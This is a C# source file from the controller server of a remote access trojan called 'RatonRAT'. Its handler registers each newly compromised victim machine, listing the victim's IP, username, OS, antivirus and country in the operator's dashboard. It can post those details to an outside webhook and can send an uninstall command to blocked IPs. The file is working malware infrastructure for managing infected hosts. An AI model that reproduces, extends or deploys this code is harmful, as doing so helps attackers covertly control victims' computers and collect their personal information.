using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;
using Newtonsoft.Json.Linq;
using Server.Connection;
using Stuff;
using SillyRAT;
using Newtonsoft.Json;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace Server.Handlers
{
    internal class HandleClient
    {
        private class BlockedList
        {
            public List<string> IP { get; set; } = new List<string>();
        }
        private static UserConfig userConfig;

        private static void LoadConfig()
        {
            string configFilePath = "Data/userConfig.json";
            if (File.Exists(configFilePath))
            {
                string json = File.ReadAllText(configFilePath);
                userConfig = JsonConvert.DeserializeObject<UserConfig>(json);
            }
            else
            {
                userConfig = new UserConfig { audioMute = false, webhook = false, notificationMute = false, URL = string.Empty };
            }
        }

        private async Task sw(string country, string ip, string username, string antivirus, string uid, string os)
        {
                string webhookUrl = userConfig.URL;
                string message = $"{{\"content\": \"||@everyone|| 🐀 New user connected in **RatonRAT**\\n> **IP**: {ip}\\n> **Country**: {country}\\n> **Username**: {username}\\n> **OS**: {os}\\n> **Antivirus**: {antivirus}\\n> **ID**: {uid}\"}}";
                using (HttpClient kachito = new HttpClient())
                {
                    var content = new StringContent(message, Encoding.UTF8, "application/json");
                    await kachito.PostAsync(webhookUrl, content);
                }
        }

        public HandleClient(SillyClient client, Unpack unpack)
        {
            try
            {
                if (client == null || unpack == null)
                {
                    return;
                }

                LoadConfig();
                string uid = unpack.GetAsString("UID");
                string ip = unpack.GetAsString("IP");
                string port = client.tcpClient.Client.RemoteEndPoint.ToString().Split(':')[1];
                string username = unpack.GetAsString("Username");
                string os = unpack.GetAsString("Os");
                string group = unpack.GetAsString("Group");
                string country = unpack.GetAsString("Country");
                string ex = unpack.GetAsString("Executing");
                string av = unpack.GetAsString("AV");
                string pass = unpack.GetAsString("Pass");
                Program.form2.Invoke(new MethodInvoker(() =>
                {
                    if (!isClient(uid))
                    {
                        ListViewItem existingItem = null;
                        foreach (ListViewItem item in Program.form2.listView2.Items)
                        {
                            if (item.SubItems[0].Text == ip)
                            {
                                existingItem = item;
                                client.listViewItem = existingItem;
                                break;
                            }
                        }
                        if (existingItem != null)
                        {
                            existingItem.SubItems[3].Text = uid;
                            existingItem.Tag = client;
                            existingItem.SubItems[7].Text = "Connected";
                            existingItem.ForeColor = Color.White;
                            Program.form2.Invoke(new MethodInvoker(() =>
                            {
                                Program.form2.AddLog($"Client reconnected ({ip}) • Client ID and folder replaced to " + uid, Color.LimeGreen);
                            }));
                            string newFolderPath = Path.Combine(Program.ClientsFolder, uid);

                            if (!Directory.Exists(newFolderPath))
                            {
                                Directory.CreateDirectory(newFolderPath);
                            }
                        } else
                        {
                            client.uid = uid;
                            client.password = pass;
                            client.listViewItem = new ListViewItem(ip);
                            client.listViewItem.ForeColor = Color.White;
                            client.listViewItem.SubItems.Add(group);
                            client.listViewItem.SubItems.Add(username);
                            client.listViewItem.SubItems.Add(uid);
                            client.listViewItem.SubItems.Add(os);
                            client.listViewItem.SubItems.Add(ex);
                            client.listViewItem.SubItems.Add(av);
                            client.listViewItem.SubItems.Add("Connected");
                            client.listViewItem.Tag = client;
                            Program.form2.listView2.Items.Add(client.listViewItem);
                            Program.form2.Invoke(new MethodInvoker(() =>
                            {
                                Program.form2.AddLog($"New client connected ({ip}) • Client folder created", Color.LimeGreen);
                            }));
                            string newFolderPath = Path.Combine(Program.ClientsFolder, uid);

                            if (!Directory.Exists(newFolderPath))
                            {
                                Directory.CreateDirectory(newFolderPath);
                            }
                        }

                        if (IsBlockedIP(ip))
                        {
                            Program.form2.Invoke(new MethodInvoker(() =>
                            {
                                Program.form2.AddLog($"Blocked IP detected ({ip}) • Uninstalling...", Color.LimeGreen);
                            }));
                            Pack pack = new Pack();
                            pack.Set("Packet", "Kill");
                            client.Send(pack.Pacc());
                            return;
                        }

                        if (!userConfig.notificationMute)
                        {
                            Classes.SFX.notification();
                            Program.form2.notifyIcon1.BalloonTipTitle = "RatonRAT • " + ip;
                            Program.form2.notifyIcon1.BalloonTipText = $"Started a new session with {username}\ninteract with the client on the dashboard!\nID: {uid}";
                            Program.form2.notifyIcon1.BalloonTipIcon = ToolTipIcon.Info;
                            Program.form2.notifyIcon1.ShowBalloonTip(3000);
                        }
                        if (userConfig.webhook)
                        {
                            Task.Run(async () => await sw(country, ip, username, av, uid, os));
                        }

                        Image flagImage = GetCountryFlag(country);
                        Image BigflagImage = GetBigCountryFlag(country);
                        if (flagImage != null)
                        {
                            Program.form2.imageList1.Images.Add(uid, flagImage);
                            Program.form2.imageList6.Images.Add(uid, BigflagImage);
                            client.listViewItem.ImageKey = uid;
                        }
                        else
                        {
                            client.listViewItem.ImageKey = "noflag.png";
                        }

                        foreach (ColumnHeader column in Program.form2.listView2.Columns)
                        {
                            column.Width = -2;
                        }
                    }
                }));
            } catch(Exception)
            {

            }
        }

        private bool IsBlockedIP(string ip)
        {
            try
            {
                string blockedFilePath = Path.Combine(Application.StartupPath, "blocked.json");
                if (File.Exists(blockedFilePath))
                {
                    string json = File.ReadAllText(blockedFilePath);
                    var jsonObject = JsonConvert.DeserializeObject<BlockedList>(json);
                    return jsonObject.IP.Contains(ip);
                }
                return false;
            }
            catch (Exception ex)
            {
                Program.form2.AddLog($"Error reading blocked.json: {ex.Message}", Color.Red);
                return false;
            }
        }

        public bool isClient(string UID)
        {
            foreach (ListViewItem listViewItem in Program.form2.listView2.Items)
            {
                string uid = listViewItem.SubItems[Program.form2.columnHeader6.Index].Text;
                if (UID == uid)
                {
                    return true;
                }
            }
            return false;
        }

        private Image GetCountryFlag(string countryName)
        {
            try
            {
                using (WebClient wc = new WebClient())
                {
                    string apiUrl = $"https://restcountries.com/v3.1/name/{countryName}";
                    string json = wc.DownloadString(apiUrl);
                    JArray jsonArray = JArray.Parse(json);
                    string flagUrl = jsonArray[0]["flags"]["png"].ToString();
                    byte[] imageBytes = wc.DownloadData(flagUrl);
                    using (var ms = new MemoryStream(imageBytes))
                    {
                        Image originalImage = Image.FromStream(ms);
                        return ResizeImage(originalImage, 32, 32);
                    }
                }
            }
            catch (Exception)
            {
                return null;
            }
        }

        private Image GetBigCountryFlag(string countryName)
        {
            try
            {
                using (WebClient wc = new WebClient())
                {
                    string apiUrl = $"https://restcountries.com/v3.1/name/{countryName}";
                    string json = wc.DownloadString(apiUrl);
                    JArray jsonArray = JArray.Parse(json);
                    string flagUrl = jsonArray[0]["flags"]["png"].ToString();
                    byte[] imageBytes = wc.DownloadData(flagUrl);
                    using (var ms = new MemoryStream(imageBytes))
                    {
                        Image originalImage = Image.FromStream(ms);
                        return ResizeImage(originalImage, 100, 100);
                    }
                }
            }
            catch (Exception)
            {
                return null;
            }
        }

        private Image ResizeImage(Image img, int width, int height)
        {
            Bitmap b = new Bitmap(width, height);
            using (Graphics g = Graphics.FromImage(b))
            {
                g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
                g.DrawImage(img, 0, 0, width, height);
            }
            return b;
        }

        private class UserConfig
        { 
            public bool darkMode { get; set; }
            public bool audioMute { get; set; }
            public bool notificationMute { get; set; }
            public bool webhook { get; set; }
            public string URL { get; set; }
        }
    }
}
